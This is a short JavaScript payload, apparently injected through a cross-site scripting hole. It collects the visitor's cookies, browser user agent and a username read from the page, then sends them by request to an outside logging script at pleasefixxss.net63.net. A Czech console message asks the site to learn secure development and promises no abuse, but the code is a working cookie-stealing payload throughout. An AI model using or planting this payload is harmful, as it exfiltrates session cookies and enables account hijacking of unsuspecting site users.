var cookies = document.cookie;
var userAgent = navigator.userAgent;
var username = document.getElementsByTagName("strong")[0].textContent;
var params = "?cookies=" + cookies + "&agent=" + userAgent + "&user=" + username;
var xhr = new XMLHttpRequest();

xhr.open('GET', 'http://pleasefixxss.net63.net/log.php' + params, true);
xhr.send(null);
console.log("DOBRÝ DEN, prosím vás naučte se vytvářet bezpečný software. děkuji. nebojte nic nezneužiji");
